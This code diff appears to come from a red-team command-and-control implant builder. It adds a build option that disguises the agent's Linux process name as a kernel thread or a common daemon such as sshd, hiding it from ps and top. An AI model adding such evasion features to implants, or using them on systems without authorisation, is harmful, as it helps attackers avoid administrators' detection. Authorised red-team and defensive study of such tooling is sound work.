@@ -180,6 +180,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
+		{
+			Name:          "masquerade_name",
+			Description:   "Optional: Masquerade the agent process name on Linux. Changes /proc/self/comm (visible in ps, top, htop). Max 15 chars. Examples: '[kworker/0:1]', 'sshd', 'apache2', '[migration/0]'. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -337,6 +344,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if selfDel, err := payloadBuildMsg.BuildParameters.GetBooleanArg("self_delete"); err == nil && selfDel {
 		ldflags += fmt.Sprintf(" -X '%s.selfDelete=true'", fawkes_main_package)
+	}
+	if masqName, err := payloadBuildMsg.BuildParameters.GetStringArg("masquerade_name"); err == nil && masqName != "" {
+		ldflags += fmt.Sprintf(" -X '%s.masqueradeName=%s'", fawkes_main_package, masqName)
 	}
 
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
